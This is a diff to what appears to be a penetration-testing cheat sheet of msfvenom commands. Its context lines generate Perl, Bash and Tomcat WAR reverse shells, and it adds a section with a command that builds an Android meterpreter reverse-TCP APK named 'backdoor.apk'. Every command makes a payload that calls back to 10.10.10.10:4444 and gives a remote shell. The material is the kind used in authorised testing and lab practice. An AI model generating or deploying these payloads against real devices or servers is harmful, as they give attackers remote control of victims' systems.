@@ -92,3 +92,9 @@ Below are some different payload commands. I have grouped them with a heading to
 | Perl Reverse TCP | `msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4444 -f raw > shell.pl` |
 | WAR File (Tomcat deployment) | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war > shell.war` |
 | Bash Reverse TCP | `msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f raw > shell.sh` |
+
+### Android Payloads
+
+| Description | Command |
+| --- | --- |
+| Android Reverse TCP APK | `msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -o backdoor.apk` |
